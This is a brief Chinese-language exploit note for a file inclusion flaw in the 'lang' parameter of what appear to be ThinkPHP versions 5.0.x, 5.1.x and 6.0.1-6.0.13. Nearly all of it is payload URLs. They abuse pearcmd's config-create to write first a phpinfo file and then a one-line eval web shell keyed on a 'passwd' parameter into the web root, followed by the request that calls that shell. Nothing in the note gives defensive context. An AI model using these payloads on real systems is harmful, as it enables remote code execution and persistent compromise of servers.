6.0.1-6.0.13
5.0.x
5.1.x

抓包发送
http://127.0.0.1/public/index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?=phpinfo()?>+/tmp/info.php
访问
http://127.0.0.1/public/index.php?lang=../../../../../../../../tmp/info

一句话
http://127.0.0.1/public/index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?=@eval($_REQUEST['passwd']);?>+/var/www/html/shell.php
访问
http://127.0.0.1/shellphp?passwd=phpinfo();